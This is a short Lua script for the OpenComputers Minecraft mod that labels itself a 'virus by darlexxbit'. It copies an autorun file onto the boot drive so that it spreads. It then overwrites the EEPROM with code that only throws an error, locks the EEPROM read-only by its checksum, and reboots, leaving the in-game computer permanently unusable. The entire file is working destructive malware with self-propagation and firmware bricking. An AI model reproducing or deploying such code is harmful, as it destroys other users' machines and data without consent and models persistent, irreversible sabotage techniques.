local component = require("component")
local filesystem = require('filesystem')
local computer = require("computer")

local path = computer.getBootAddress():sub(1,3)
filesystem.copy('mnt/489/autorun.lua', 'mnt/'..path..'/autorun.lua')

component.eeprom.set('error("virus by darlexxbit")')
local checksum = component.eeprom.getChecksum()
component.eeprom.makeReadonly(checksum)

computer.shutdown(true)